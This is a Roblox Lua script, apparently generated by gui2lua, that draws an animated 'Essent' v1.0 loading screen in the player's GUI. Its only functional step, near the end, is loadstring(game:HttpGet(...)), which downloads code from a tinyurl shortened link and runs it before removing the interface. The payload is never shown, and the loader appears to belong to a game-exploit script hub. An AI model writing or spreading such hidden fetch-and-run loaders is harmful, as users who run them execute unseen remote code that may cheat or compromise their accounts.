--gui2lua by uniqadev was used :D

-- Instances: 19 | Scripts: 1 | Modules: 0 | Tags: 0
local G2L = {};

-- StarterGui.EssentLoadUI
G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
G2L["1"]["Name"] = [[EssentLoadUI]];
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;


-- StarterGui.EssentLoadUI.EssentLoad
G2L["2"] = Instance.new("Frame", G2L["1"]);
G2L["2"]["BorderSizePixel"] = 0;
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2"]["ClipsDescendants"] = true;
G2L["2"]["Size"] = UDim2.new(0, 403, 0, 241);
G2L["2"]["Position"] = UDim2.new(0.37445, 0, 0.36444, 0);
G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2"]["Name"] = [[EssentLoad]];


-- StarterGui.EssentLoadUI.EssentLoad.UIToolsGradient
G2L["3"] = Instance.new("UIGradient", G2L["2"]);
G2L["3"]["Name"] = [[UIToolsGradient]];
G2L["3"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(30, 30, 30)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(48, 48, 48))};


-- StarterGui.EssentLoadUI.EssentLoad.cust
G2L["4"] = Instance.new("Frame", G2L["2"]);
G2L["4"]["BorderSizePixel"] = 0;
G2L["4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4"]["ClipsDescendants"] = true;
G2L["4"]["Size"] = UDim2.new(0, 403, 0, 110);
G2L["4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4"]["Name"] = [[cust]];


-- StarterGui.EssentLoadUI.EssentLoad.cust.UIStroke
G2L["5"] = Instance.new("UIStroke", G2L["4"]);
G2L["5"]["Thickness"] = 5;
G2L["5"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.EssentLoadUI.EssentLoad.cust.UIGradient
G2L["6"] = Instance.new("UIGradient", G2L["4"]);
G2L["6"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 63, 255)),ColorSequenceKeypoint.new(0.509, Color3.fromRGB(96, 91, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(62, 182, 255))};


-- StarterGui.EssentLoadUI.EssentLoad.cust.TL
G2L["7"] = Instance.new("TextLabel", G2L["4"]);
G2L["7"]["TextWrapped"] = true;
G2L["7"]["BorderSizePixel"] = 0;
G2L["7"]["TextSize"] = 14;
G2L["7"]["TextScaled"] = true;
G2L["7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7"]["BackgroundTransparency"] = 1;
G2L["7"]["Size"] = UDim2.new(0, 246, 0, 77);
G2L["7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7"]["Text"] = [[Essent]];
G2L["7"]["Name"] = [[TL]];
G2L["7"]["Position"] = UDim2.new(0.19355, 0, -0.04979, 0);


-- StarterGui.EssentLoadUI.EssentLoad.cust.TL.UIGradient
G2L["8"] = Instance.new("UIGradient", G2L["7"]);
G2L["8"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(0.509, Color3.fromRGB(91, 190, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(166, 255, 118))};


-- StarterGui.EssentLoadUI.EssentLoad.cust.TL.UIStroke
G2L["9"] = Instance.new("UIStroke", G2L["7"]);
G2L["9"]["Thickness"] = 3;
G2L["9"]["Color"] = Color3.fromRGB(132, 132, 132);


-- StarterGui.EssentLoadUI.EssentLoad.cust.V
G2L["a"] = Instance.new("TextLabel", G2L["4"]);
G2L["a"]["TextWrapped"] = true;
G2L["a"]["BorderSizePixel"] = 0;
G2L["a"]["TextSize"] = 14;
G2L["a"]["TextScaled"] = true;
G2L["a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a"]["BackgroundTransparency"] = 1;
G2L["a"]["Size"] = UDim2.new(0, 223, 0, 23);
G2L["a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a"]["Text"] = [[v1.0]];
G2L["a"]["Name"] = [[V]];
G2L["a"]["Position"] = UDim2.new(0.22333, 0, 0.58789, 0);


-- StarterGui.EssentLoadUI.EssentLoad.cust.V.UIGradient
G2L["b"] = Instance.new("UIGradient", G2L["a"]);
G2L["b"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(0.509, Color3.fromRGB(91, 190, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(166, 255, 118))};


-- StarterGui.EssentLoadUI.EssentLoad.cust.V.UIStroke
G2L["c"] = Instance.new("UIStroke", G2L["a"]);
G2L["c"]["Thickness"] = 3;
G2L["c"]["Color"] = Color3.fromRGB(132, 132, 132);


-- StarterGui.EssentLoadUI.EssentLoad.UIStroke
G2L["d"] = Instance.new("UIStroke", G2L["2"]);
G2L["d"]["Thickness"] = 5;
G2L["d"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.EssentLoadUI.EssentLoad.UIStroke.UIGradient
G2L["e"] = Instance.new("UIGradient", G2L["d"]);
G2L["e"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(183, 131, 255)),ColorSequenceKeypoint.new(0.478, Color3.fromRGB(84, 255, 153)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(116, 123, 255))};


-- StarterGui.EssentLoadUI.EssentLoad.LoadingCircle
G2L["f"] = Instance.new("ImageLabel", G2L["2"]);
G2L["f"]["BorderSizePixel"] = 0;
G2L["f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f"]["Image"] = [[rbxassetid://15802670993]];
G2L["f"]["Size"] = UDim2.new(0, 50, 0, 50);
G2L["f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f"]["BackgroundTransparency"] = 1;
G2L["f"]["Name"] = [[LoadingCircle]];
G2L["f"]["Position"] = UDim2.new(0.43672, 0, 0.72199, 0);


-- StarterGui.EssentLoadUI.EssentLoad.LoadingCircle.LocalScript
G2L["10"] = Instance.new("LocalScript", G2L["f"]);



-- StarterGui.EssentLoadUI.EssentLoad.Loadingtext
G2L["11"] = Instance.new("TextLabel", G2L["2"]);
G2L["11"]["TextWrapped"] = true;
G2L["11"]["BorderSizePixel"] = 0;
G2L["11"]["TextSize"] = 14;
G2L["11"]["TextScaled"] = true;
G2L["11"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["11"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["11"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["11"]["BackgroundTransparency"] = 1;
G2L["11"]["Size"] = UDim2.new(0, 403, 0, 41);
G2L["11"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11"]["Text"] = [[Loading...]];
G2L["11"]["Name"] = [[Loadingtext]];
G2L["11"]["Position"] = UDim2.new(0, 0, 0.50622, 0);


-- StarterGui.EssentLoadUI.EssentLoad.Loadingtext.UIGradient
G2L["12"] = Instance.new("UIGradient", G2L["11"]);
G2L["12"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(0.509, Color3.fromRGB(255, 175, 175)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.EssentLoadUI.EssentLoad.Loadingtext.UIStroke
G2L["13"] = Instance.new("UIStroke", G2L["11"]);
G2L["13"]["Thickness"] = 3;
G2L["13"]["Color"] = Color3.fromRGB(132, 132, 132);


-- StarterGui.EssentLoadUI.EssentLoad.LoadingCircle.LocalScript
local function C_10()
local script = G2L["10"];
	script.Parent.Transparency = 01
	
	for i = 1, math.random(250, 450) do
		script.Parent.Rotation += 8
		task.wait(0.01)
		if script.Parent.Rotation == 360 then
			script.Parent.Rotation = 0
		end
	end
	
	
	
	for i = 1, 20 do
		script.Parent.ImageTransparency += 0.05
		script.Parent.Parent.Loadingtext.TextTransparency += 0.05
		script.Parent.Parent.Loadingtext.UIStroke.Transparency += 0.05
		task.wait(0.02)
	end
	
	script.Parent.Parent.cust:TweenSize(UDim2.new(0, 403,0, 241), Enum.EasingDirection.InOut, Enum.EasingStyle.Sine, 0.2, true)
	script.Parent.Parent.cust.TL:TweenPosition(UDim2.new(0.194, 0,0.286, 0), Enum.EasingDirection.InOut, Enum.EasingStyle.Sine, 0.2, true)
	
	script.Parent.Parent.Loadingtext:Destroy()
	
	task.wait(0.85)
	
	loadstring(game:HttpGet("https://tinyurl.com/yckx7xj8"))()
	
	script.Parent.Parent.Parent:Destroy()
end;
task.spawn(C_10);

return G2L["1"], require;